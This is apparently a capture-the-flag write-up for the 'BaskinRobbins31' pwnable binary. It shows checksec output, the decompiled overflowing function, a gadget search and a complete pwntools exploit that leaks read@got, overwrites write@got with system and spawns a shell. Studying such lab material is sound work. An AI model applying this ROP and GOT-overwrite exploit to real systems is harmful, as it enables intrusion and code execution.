# BaskinRobbins31

```bash
checksec ./BaskinRobbins31
[*] '/home/ubuntu/Desktop/Pwnable/rop/BaskinRobbins31/BaskinRobbins31'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

This binary has `NX-bit` and `Partical RELRO`.

And here is disassembled code.

```c
signed __int64 __fastcall your_turn(_DWORD *a1)
{
  signed __int64 result; // rax
  char s; // [rsp+10h] [rbp-B0h]
  size_t n; // [rsp+B0h] [rbp-10h]
  int v4; // [rsp+BCh] [rbp-4h]

  v4 = 0;
  memset(&s, 0, 0x96uLL);
  puts("How many numbers do you want to take ? (1-3)");
  n = read(0, &s, 0x190uLL);
  write(1, &s, n);
  putchar(10);
  v4 = strtoul(&s, 0LL, 10);
  if ( check_decision(v4, 0LL) )
  {
    *a1 -= v4;
    result = 1LL;
  }
  else
  {
    puts("Don't break the rules...:( ");
    result = 0LL;
  }
  return result;
}
```

I can find vulunablity to use rop. `s` is `0x96` bytes array, and `n = read(0, &s, 0x190uLL);` this is vulunable code.

`s` is in `[ebp - 0xB0]`, so I give dummy `0xB0` bytes, and `8 bytes sfp`. After that, I make ROP code.

```c
write(1, read@got, 8);      // leak read@got
read(0, bss, 8);            // write '/bin/sh'
read(0, write@got, 8);      // overwrite write@got
write('/bin/sh');           // call system by write@got
```

And I find gadget, and they give me a full gadget.

```asm
rp++ -f ./BaskinRobbins31 -r 3 | grep "pop rdi"
0x0040087a: pop rdi ; pop rsi ; pop rdx ; ret  ;  (1 found)
0x00400bc3: pop rdi ; ret  ;  (1 found)
```

## exploit.py

```python
from pwn import *

context.log_level = 'debug'

binary = ELF('./BaskinRobbins31')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

read_plt = binary.plt['read']
read_got = binary.got['read']
write_plt = binary.plt['write']
write_got = binary.got['write']

bss = binary.bss()

system_offset = libc.symbols['system']
read_offset = libc.symbols['read']

read_system_offset = read_offset - system_offset

pppr = 0x0040087a # pop rdi; pop rsi; pop rdx; ret

payload = 'a'*0xb0 + 'b'*8
payload += p64(pppr) + p64(1) + p64(read_got) + p64(8) + p64(write_plt)
payload += p64(pppr) + p64(0) + p64(bss) + p64(8) + p64(read_plt)
payload += p64(pppr) +p64(0) + p64(write_got) + p64(8) + p64(read_plt)
payload += p64(pppr) + p64(bss) + 'b'*8 + 'c'*8 + p64(write_plt)

p = process('./BaskinRobbins31')

p.recv()
p.sendline(payload)
leak_read = u64(p.recv()[-8:])
log.info('leaked read: ' + hex(leak_read))
leak_system = leak_read - read_system_offset
log.info('leaked system: ' + hex(leak_system))

p.sendline('/bin/sh')
p.sendline(p64(leak_system))
p.interactive()
```
